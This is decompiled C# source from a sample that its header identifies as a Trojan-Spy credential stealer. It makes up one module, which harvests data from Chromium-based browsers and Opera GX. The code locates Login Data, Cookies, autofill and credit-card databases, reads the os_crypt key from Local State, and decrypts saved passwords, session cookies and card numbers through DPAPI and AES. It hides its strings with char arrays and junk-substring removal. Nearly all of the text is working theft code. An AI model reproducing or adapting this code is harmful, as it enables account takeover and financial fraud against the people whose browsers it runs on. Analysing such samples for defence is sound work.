// Decompiled with JetBrains decompiler
// Type: SystemNetCookieModuleI
// Assembly: Pursuits, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5AE29391-E6B0-4A11-8563-A9AF244B152D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-Spy.MSIL.Stealer.gen-f5d5176d0ac8a6c9093f39208d3aff397cce06017bbf0f2e4fee86a5ce09a398.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;

public static class SystemNetCookieModuleI
{
  public static List<SystemCodeDomCodeRegionDirectiveQ> Sсаn(
    IList<string> profiles)
  {
    List<SystemCodeDomCodeRegionDirectiveQ> regionDirectiveQList = new List<SystemCodeDomCodeRegionDirectiveQ>();
    try
    {
      foreach (string baseDirectory in profiles.Select<string, string>((Func<string, string>) (x => Environment.ExpandEnvironmentVariables(x))))
      {
        foreach (string path in SystemNetTimerThreadQueueC.FindPaths(baseDirectory, 1, 1, "LEnvironmentogiEnvironmentn DatEnvironmenta".Replace("Environment", string.Empty), "WSystem.Texteb DatSystem.Texta".Replace("System.Text", string.Empty), "CoCryptographyokieCryptographys".Replace("Cryptography", string.Empty), "ExtGenericension CooGenerickies".Replace("Generic", string.Empty)))
        {
          SystemCodeDomCodeRegionDirectiveQ regionDirectiveQ1 = new SystemCodeDomCodeRegionDirectiveQ();
          string dataFolder = string.Empty;
          string empty = string.Empty;
          try
          {
            dataFolder = new FileInfo(path).Directory.FullName;
            string str1 = !dataFolder.Contains("OFileInfopeFileInfora GFileInfoX StabFileInfole".Replace("FileInfo", string.Empty)) ? (path.Contains("ApGenericpDaGenericta\\RGenericoamiGenericng\\".Replace("Generic", string.Empty)) ? SystemNetTimerThreadQueueC.ChromeGetRoamingName(dataFolder) : SystemNetTimerThreadQueueC.ChromeGetLocalName(dataFolder)) : "OpLinqera GLinqX".Replace("Linq", string.Empty);
            if (!string.IsNullOrEmpty(str1))
            {
              string str2 = str1[0].ToString().ToUpper() + str1.Remove(0, 1);
              string name = SystemNetTimerThreadQueueC.ChromeGetName(dataFolder);
              if (!string.IsNullOrEmpty(name))
              {
                List<dnlibDotNetFieldSigs> dnlibDotNetFieldSigsList = SystemNetCookieModuleI.MakeTries<List<dnlibDotNetFieldSigs>>((Func<List<dnlibDotNetFieldSigs>>) (() => SystemNetCookieModuleI.ScanCook(dataFolder, new string(new char[7]
                {
                  'C',
                  'o',
                  'o',
                  'k',
                  'i',
                  'e',
                  's'
                }))), (Func<List<dnlibDotNetFieldSigs>, bool>) (x => x.Count > 0));
                List<dnlibDotNetFieldSigs> source1 = SystemNetCookieModuleI.MakeTries<List<dnlibDotNetFieldSigs>>((Func<List<dnlibDotNetFieldSigs>>) (() => SystemNetCookieModuleI.ScanCook(dataFolder, "Network\\" + new string(new char[7]
                {
                  'C',
                  'o',
                  'o',
                  'k',
                  'i',
                  'e',
                  's'
                }))), (Func<List<dnlibDotNetFieldSigs>, bool>) (x => x.Count > 0));
                List<dnlibDotNetFieldSigs> source2 = SystemNetCookieModuleI.MakeTries<List<dnlibDotNetFieldSigs>>((Func<List<dnlibDotNetFieldSigs>>) (() => SystemNetCookieModuleI.ScanCook(dataFolder, new string(new char[17]
                {
                  'E',
                  'x',
                  't',
                  'e',
                  'n',
                  's',
                  'i',
                  'o',
                  'n',
                  ' ',
                  'C',
                  'o',
                  'o',
                  'k',
                  'i',
                  'e',
                  's'
                }))), (Func<List<dnlibDotNetFieldSigs>, bool>) (x => x.Count > 0));
                regionDirectiveQ1.Id1 = str2;
                regionDirectiveQ1.Id2 = name;
                regionDirectiveQ1.Id3 = (IList<SystemComponentModelCultureInfoConverterb>) SystemNetCookieModuleI.MakeTries<List<SystemComponentModelCultureInfoConverterb>>((Func<List<SystemComponentModelCultureInfoConverterb>>) (() => SystemNetCookieModuleI.ScanPasswords(dataFolder)), (Func<List<SystemComponentModelCultureInfoConverterb>, bool>) (x => x.Count > 0));
                regionDirectiveQ1.Id6 = (IList<dnlibDotNetFieldSigs>) dnlibDotNetFieldSigsList;
                regionDirectiveQ1.Id4 = (IList<SystemNetSafeCloseIcmpHandlev>) SystemNetCookieModuleI.MakeTries<List<SystemNetSafeCloseIcmpHandlev>>((Func<List<SystemNetSafeCloseIcmpHandlev>>) (() => SystemNetCookieModuleI.ScanFills(dataFolder)), (Func<List<SystemNetSafeCloseIcmpHandlev>, bool>) (x => x.Count > 0));
                regionDirectiveQ1.Id5 = (IList<SystemComponentModelDesignServiceCreatorCallbackY>) SystemNetCookieModuleI.MakeTries<List<SystemComponentModelDesignServiceCreatorCallbackY>>((Func<List<SystemComponentModelDesignServiceCreatorCallbackY>>) (() => SystemNetCookieModuleI.GetEntityCards(dataFolder)), (Func<List<SystemComponentModelDesignServiceCreatorCallbackY>, bool>) (x => x.Count > 0));
                if (source1.Any<dnlibDotNetFieldSigs>())
                {
                  SystemCodeDomCodeRegionDirectiveQ regionDirectiveQ2 = new SystemCodeDomCodeRegionDirectiveQ()
                  {
                    Id1 = str2,
                    Id2 = name + " Network",
                    Id3 = (IList<SystemComponentModelCultureInfoConverterb>) new List<SystemComponentModelCultureInfoConverterb>(),
                    Id6 = (IList<dnlibDotNetFieldSigs>) source1,
                    Id4 = (IList<SystemNetSafeCloseIcmpHandlev>) new List<SystemNetSafeCloseIcmpHandlev>(),
                    Id5 = (IList<SystemComponentModelDesignServiceCreatorCallbackY>) new List<SystemComponentModelDesignServiceCreatorCallbackY>()
                  };
                  regionDirectiveQList.Add(regionDirectiveQ2);
                }
                if (source2.Any<dnlibDotNetFieldSigs>())
                {
                  SystemCodeDomCodeRegionDirectiveQ regionDirectiveQ3 = new SystemCodeDomCodeRegionDirectiveQ()
                  {
                    Id1 = str2,
                    Id2 = name + " Extension",
                    Id3 = (IList<SystemComponentModelCultureInfoConverterb>) new List<SystemComponentModelCultureInfoConverterb>(),
                    Id6 = (IList<dnlibDotNetFieldSigs>) source2,
                    Id4 = (IList<SystemNetSafeCloseIcmpHandlev>) new List<SystemNetSafeCloseIcmpHandlev>(),
                    Id5 = (IList<SystemComponentModelDesignServiceCreatorCallbackY>) new List<SystemComponentModelDesignServiceCreatorCallbackY>()
                  };
                  regionDirectiveQList.Add(regionDirectiveQ3);
                }
              }
            }
          }
          catch (Exception ex)
          {
          }
          if (!regionDirectiveQ1.Id7())
            regionDirectiveQList.Add(regionDirectiveQ1);
        }
      }
    }
    catch
    {
    }
    return regionDirectiveQList;
  }

  private static List<SystemComponentModelCultureInfoConverterb> ScanPasswords(
    string profilePath)
  {
    List<SystemComponentModelCultureInfoConverterb> cultureInfoConverterbList = new List<SystemComponentModelCultureInfoConverterb>();
    try
    {
      string str = Path.Combine(profilePath, new string(new char[10]
      {
        'L',
        'o',
        'g',
        'i',
        'n',
        ' ',
        'D',
        'a',
        't',
        'a'
      }));
      if (!File.Exists(str))
        return cultureInfoConverterbList;
      string chromeKey = SystemNetCookieModuleI.ReadKey(profilePath);
      try
      {
        SystemComponentModelRunInstallerAttributeJ installerAttributeJ = new SystemComponentModelRunInstallerAttributeJ(str);
        installerAttributeJ.ReadContextTable(new string(new char[6]
        {
          'l',
          'o',
          'g',
          'i',
          'n',
          's'
        }));
        for (int rowNum = 0; rowNum < installerAttributeJ.RowLength; ++rowNum)
        {
          SystemComponentModelCultureInfoConverterb cultureInfoConverterb = new SystemComponentModelCultureInfoConverterb();
          try
          {
            cultureInfoConverterb.Id1 = installerAttributeJ.ReadContextValue(rowNum, 0).Trim();
            cultureInfoConverterb.Id2 = installerAttributeJ.ReadContextValue(rowNum, 3).Trim();
            cultureInfoConverterb.Id3 = SystemNetCookieModuleI.ReadRawData(installerAttributeJ.ReadContextValue(rowNum, 5), chromeKey);
          }
          catch (Exception ex)
          {
          }
          finally
          {
            cultureInfoConverterb.Id1 = string.IsNullOrWhiteSpace(cultureInfoConverterb.Id1) ? "UNKNOWN" : cultureInfoConverterb.Id1;
            cultureInfoConverterb.Id2 = string.IsNullOrWhiteSpace(cultureInfoConverterb.Id2) ? "UNKNOWN" : cultureInfoConverterb.Id2;
            cultureInfoConverterb.Id3 = string.IsNullOrWhiteSpace(cultureInfoConverterb.Id3) ? "UNKNOWN" : cultureInfoConverterb.Id3;
          }
          if (cultureInfoConverterb.Id3 != "UNKNOWN")
            cultureInfoConverterbList.Add(cultureInfoConverterb);
        }
      }
      catch (Exception ex)
      {
      }
    }
    catch (Exception ex)
    {
    }
    return cultureInfoConverterbList;
  }

  private static List<dnlibDotNetFieldSigs> ScanCook(
    string profilePath,
    string dbPath)
  {
    List<dnlibDotNetFieldSigs> dnlibDotNetFieldSigsList = new List<dnlibDotNetFieldSigs>();
    try
    {
      string str = Path.Combine(profilePath, dbPath);
      if (!File.Exists(str))
        return dnlibDotNetFieldSigsList;
      string chromeKey = SystemNetCookieModuleI.ReadKey(profilePath);
      try
      {
        SystemComponentModelRunInstallerAttributeJ installerAttributeJ = new SystemComponentModelRunInstallerAttributeJ(str);
        installerAttributeJ.ReadContextTable(new string(new char[7]
        {
          'c',
          'o',
          'o',
          'k',
          'i',
          'e',
          's'
        }));
        for (int rowIndex = 0; rowIndex < installerAttributeJ.RowLength; ++rowIndex)
        {
          dnlibDotNetFieldSigs dnlibDotNetFieldSigs = (dnlibDotNetFieldSigs) null;
          try
          {
            dnlibDotNetFieldSigs = new dnlibDotNetFieldSigs()
            {
              Id1 = installerAttributeJ.GatherValue(rowIndex, new string(new char[8]
              {
                'h',
                'o',
                's',
                't',
                '_',
                'k',
                'e',
                'y'
              })).Trim(),
              Id2 = (installerAttributeJ.GatherValue(rowIndex, new string(new char[8]
              {
                'h',
                'o',
                's',
                't',
                '_',
                'k',
                'e',
                'y'
              })).Trim().StartsWith(".") ? 1 : 0) != 0,
              Id3 = installerAttributeJ.GatherValue(rowIndex, new string(new char[4]
              {
                'p',
                'a',
                't',
                'h'
              })).Trim(),
              Id4 = (installerAttributeJ.GatherValue(rowIndex, new string(new char[9]
              {
                'i',
                's',
                '_',
                's',
                'e',
                'c',
                'u',
                'r',
                'e'
              })).Contains("1") ? 1 : 0) != 0,
              Id5 = Convert.ToInt64(installerAttributeJ.GatherValue(rowIndex, new string(new char[11]
              {
                'e',
                'x',
                'p',
                'i',
                'r',
                'e',
                's',
                '_',
                'u',
                't',
                'c'
              })).Trim()) / 1000000L - 11644473600L,
              Id6 = installerAttributeJ.GatherValue(rowIndex, new string(new char[4]
              {
                'n',
                'a',
                'm',
                'e'
              })).Trim(),
              Id7 = SystemNetCookieModuleI.ReadRawData(installerAttributeJ.GatherValue(rowIndex, new string(new char[15]
              {
                'e',
                'n',
                'c',
                'r',
                'y',
                'p',
                't',
                'e',
                'd',
                '_',
                'v',
                'a',
                'l',
                'u',
                'e'
              })), chromeKey)
            };
            if (dnlibDotNetFieldSigs.Id5 < 0L)
              dnlibDotNetFieldSigs.Id5 = DateTime.Now.AddMonths(12).Ticks - 621355968000000000L;
          }
          catch
          {
          }
          if (!string.IsNullOrWhiteSpace(dnlibDotNetFieldSigs?.Id7))
            dnlibDotNetFieldSigsList.Add(dnlibDotNetFieldSigs);
        }
      }
      catch
      {
      }
    }
    catch (Exception ex)
    {
    }
    return dnlibDotNetFieldSigsList;
  }

  private static List<SystemNetSafeCloseIcmpHandlev> ScanFills(
    string profilePath)
  {
    List<SystemNetSafeCloseIcmpHandlev> closeIcmpHandlevList = new List<SystemNetSafeCloseIcmpHandlev>();
    try
    {
      string str = Path.Combine(profilePath, new string(new char[8]
      {
        'W',
        'e',
        'b',
        ' ',
        'D',
        'a',
        't',
        'a'
      }));
      if (!File.Exists(str))
        return closeIcmpHandlevList;
      string chromeKey = SystemNetCookieModuleI.ReadKey(profilePath);
      try
      {
        SystemComponentModelRunInstallerAttributeJ installerAttributeJ = new SystemComponentModelRunInstallerAttributeJ(str);
        installerAttributeJ.ReadContextTable(new string(new char[8]
        {
          'a',
          'u',
          't',
          'o',
          'f',
          'i',
          'l',
          'l'
        }));
        for (int rowIndex = 0; rowIndex < installerAttributeJ.RowLength; ++rowIndex)
        {
          SystemNetSafeCloseIcmpHandlev closeIcmpHandlev = (SystemNetSafeCloseIcmpHandlev) null;
          try
          {
            string chiperText = installerAttributeJ.GatherValue(rowIndex, new string(new char[5]
            {
              'v',
              'a',
              'l',
              'u',
              'e'
            })).Trim();
            if (!chiperText.StartsWith(new string(new char[3]
            {
              'v',
              '1',
              '0'
            })))
            {
              if (!chiperText.StartsWith(new string(new char[3]
              {
                'v',
                '1',
                '1'
              })))
                goto label_9;
            }
            chiperText = SystemNetCookieModuleI.ReadRawData(chiperText, chromeKey);
label_9:
            closeIcmpHandlev = new SystemNetSafeCloseIcmpHandlev()
            {
              Id1 = installerAttributeJ.GatherValue(rowIndex, new string(new char[4]
              {
                'n',
                'a',
                'm',
                'e'
              })).Trim(),
              Id2 = chiperText
            };
          }
          catch
          {
          }
          if (closeIcmpHandlev != null)
            closeIcmpHandlevList.Add(closeIcmpHandlev);
        }
      }
      catch (Exception ex)
      {
      }
    }
    catch (Exception ex)
    {
    }
    return closeIcmpHandlevList;
  }

  private static List<SystemComponentModelDesignServiceCreatorCallbackY> GetEntityCards(
    string profilePath)
  {
    List<SystemComponentModelDesignServiceCreatorCallbackY> entityCards = new List<SystemComponentModelDesignServiceCreatorCallbackY>();
    try
    {
      string str = Path.Combine(profilePath, new string(new char[8]
      {
        'W',
        'e',
        'b',
        ' ',
        'D',
        'a',
        't',
        'a'
      }));
      if (!File.Exists(str))
        return entityCards;
      string chromeKey = SystemNetCookieModuleI.ReadKey(profilePath);
      try
      {
        SystemComponentModelRunInstallerAttributeJ installerAttributeJ = new SystemComponentModelRunInstallerAttributeJ(str);
        installerAttributeJ.ReadContextTable("cFileStreamredFileStreamit_cFileStreamardFileStreams".Replace("FileStream", string.Empty));
        for (int rowNum = 0; rowNum < installerAttributeJ.RowLength; ++rowNum)
        {
          SystemComponentModelDesignServiceCreatorCallbackY creatorCallbackY = (SystemComponentModelDesignServiceCreatorCallbackY) null;
          try
          {
            creatorCallbackY = new SystemComponentModelDesignServiceCreatorCallbackY()
            {
              Id1 = installerAttributeJ.ReadContextValue(rowNum, 1).Trim(),
              Id2 = Convert.ToInt32(installerAttributeJ.ReadContextValue(rowNum, 2).Trim()),
              Id3 = Convert.ToInt32(installerAttributeJ.ReadContextValue(rowNum, 3).Trim()),
              Id4 = SystemNetCookieModuleI.ReadRawData(installerAttributeJ.ReadContextValue(rowNum, 4), chromeKey).Replace(" ", string.Empty)
            };
          }
          catch
          {
          }
          if (creatorCallbackY != null)
            entityCards.Add(creatorCallbackY);
        }
      }
      catch (Exception ex)
      {
      }
    }
    catch (Exception ex)
    {
    }
    return entityCards;
  }

  public static string ReadRawData(string chiperText, string chromeKey)
  {
    string str = string.Empty;
    try
    {
      str = chiperText[0] != 'v' || chiperText[1] != '1' ? dnlibDotNetPdbDssSymbolWriterImplF.GetDecoded(chiperText, DataProtectionScope.CurrentUser).Trim() : SystemNetConfigurationSmtpSpecifiedPickupDirectoryElementInternalI.Decrypt(Convert.FromBase64CharArray(chromeKey.ToCharArray(), 0, chromeKey.Length), chiperText);
    }
    catch (Exception ex)
    {
    }
    return str;
  }

  public static string ReadKey(string profilePath)
  {
    string str1 = string.Empty;
    string empty = string.Empty;
    try
    {
      string[] source = profilePath.Split(new string[1]
      {
        "\\"
      }, StringSplitOptions.RemoveEmptyEntries);
      string[] array = ((IEnumerable<string>) source).Take<string>(source.Length - 1).ToArray<string>();
      int num = 0;
      string str2;
      while (true)
      {
        while (num != 0)
        {
          if (num == 1)
          {
            str2 = Path.Combine(profilePath, new string(new char[11]
            {
              'L',
              'o',
              'c',
              'a',
              'l',
              ' ',
              'S',
              't',
              'a',
              't',
              'e'
            }));
            if (!File.Exists(str2))
              ++num;
            else
              goto label_13;
          }
          else if (num == 2)
          {
            str2 = Path.Combine(string.Join("\\", array), new string(new char[15]
            {
              'L',
              'o',
              'c',
              'a',
              'l',
              'P',
              'r',
              'e',
              'f',
              's',
              '.',
              'j',
              's',
              'o',
              'n'
            }));
            if (!File.Exists(str2))
              ++num;
            else
              goto label_13;
          }
          else if (num == 3)
          {
            str2 = Path.Combine(profilePath, new string(new char[15]
            {
              'L',
              'o',
              'c',
              'a',
              'l',
              'P',
              'r',
              'e',
              'f',
              's',
              '.',
              'j',
              's',
              'o',
              'n'
            }));
            goto label_13;
          }
        }
        str2 = Path.Combine(string.Join("\\", array), new string(new char[11]
        {
          'L',
          'o',
          'c',
          'a',
          'l',
          ' ',
          'S',
          't',
          'a',
          't',
          'e'
        }));
        if (!File.Exists(str2))
          ++num;
        else
          break;
      }
label_13:
      if (File.Exists(str2))
      {
        try
        {
          str1 = str2.ReadFileAsText().FromJSON<SystemNetSocketsSocketErrorc>().os_crypt.encrypted_key;
        }
        catch (Exception ex)
        {
        }
      }
    }
    catch
    {
    }
    return str1;
  }

  public static T MakeTries<T>(Func<T> func, Func<T, bool> success)
  {
    int num = 1;
    T obj = func();
    while (!success(obj))
    {
      obj = func();
      ++num;
      if (num > 2)
        return obj;
    }
    return obj;
  }
}
